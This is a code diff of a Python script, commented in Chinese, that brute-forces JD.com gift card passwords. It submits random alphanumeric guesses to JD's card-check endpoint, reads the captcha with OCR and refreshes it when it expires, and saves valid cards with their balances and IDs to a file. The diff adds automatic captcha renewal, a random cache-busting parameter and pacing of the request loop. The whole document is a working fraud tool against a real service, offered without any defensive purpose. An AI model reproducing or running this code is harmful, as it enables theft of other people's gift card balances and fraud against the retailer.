@@ -14,11 +14,12 @@ import BloomFilterUtil
 import fileUtil
 import windowsUtil
 import jsonUtil
+import time
 
 #每个位置可供选择的单词或数字
 wordList=['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
 #获取新的验证码图片的接口url
-verifyCodeUrl='http://mygiftcard.jd.com/giftcard/JDVerification.aspx?uid=%s&t=0.3688577947670343'
+verifyCodeUrl='http://mygiftcard.jd.com/giftcard/JDVerification.aspx?uid=%s'
 #通过如下url获取新的uuid
 uuidUrl='http://mygiftcard.jd.com/giftcard/index.action'
 #检查一个pwd是否可用的url
@@ -29,6 +30,7 @@ UUID=''
 imgPath='E:/private/image/'
 cardPath='E:/private/card/'
 bf=None
+VERIFY_CODE=''
 #做初始化操作
 def init():
     #创建验证码目录
@@ -71,6 +73,8 @@ def getNewUUID():
         traceback.print_exc()
 #保存验证码图片&&获取文本的验证码
 def getNewVerifyCode(verifyCodeUrl):
+    verifyCodeUrl = verifyCodeUrl+'&t='+str(random.random())
+    global VERIFY_CODE
     #下载验证码图片
 #     print('开始获取验证码：%s' % verifyCodeUrl)
     try:
@@ -82,6 +86,7 @@ def getNewVerifyCode(verifyCodeUrl):
 #         vcode = pytesseract.image_to_string(image)
         #关闭图片查看器
         windowsUtil.closeWin()
+        VERIFY_CODE = vcode
         return vcode
     except Exception as e:
         print('Error:',e)
@@ -140,7 +145,7 @@ def checkIfPassValid(url,uuid,pwd,verifyCode):
     }
 #     print('check pass post data: %s' % postData)
     checkRes = loginUtil.Navigate(url,postData)
-#     print('check pwd:%s' % pwd)
+    print('check pwd:%s' % pwd)
     print('check response: %s' % checkRes)
     code = jsonUtil.getAttr(checkRes,'code')
     if code == 'success':
@@ -150,19 +155,24 @@ def checkIfPassValid(url,uuid,pwd,verifyCode):
         #密码，面值，余额，giftCardType，cardBrand，giftCardId，激活时间，有效期开始，有效期结束
         cardStr = pwd+','+cardObj['amountTotal']+','+cardObj['amount']+','+cardObj['giftCardType']+','+cardObj['cardBrand']+','+cardObj['giftCardId']+','+cardObj['timeActived']+','+cardObj['timeBegin']+','+cardObj['timeEnd']+'\n'
         fileUtil.appendTextFile(cardPath+'list.txt', cardStr)
+    elif (code == 'verifyexpired' or code == 'verifyerr'):
+        getNewVerifyCode(verifyCodeUrl)
+        print('更新验证码成功!继续走着...')
     else:
         print('此密码验证未通过:[%s]' % getMsgByCode(code))
     
 if __name__=='__main__':
     init()
     #循环检查随机密码 每次的randPwd和verifyCode不一样 其他的参数不变
-    verifyCode = getNewVerifyCode(verifyCodeUrl)
+    getNewVerifyCode(verifyCodeUrl)
     for i in range(10000):
         randPwd = getNewRandPwd()
         #如果已经存在就重新生成随机密码
         while(bf.is_element_exist(randPwd)):
             randPwd = getNewRandPwd()
-        checkIfPassValid(checkPwdUrl,UUID,randPwd,verifyCode)
+        checkIfPassValid(checkPwdUrl,UUID,randPwd,VERIFY_CODE)
+        time.sleep(0.1)
+        
     
         
     
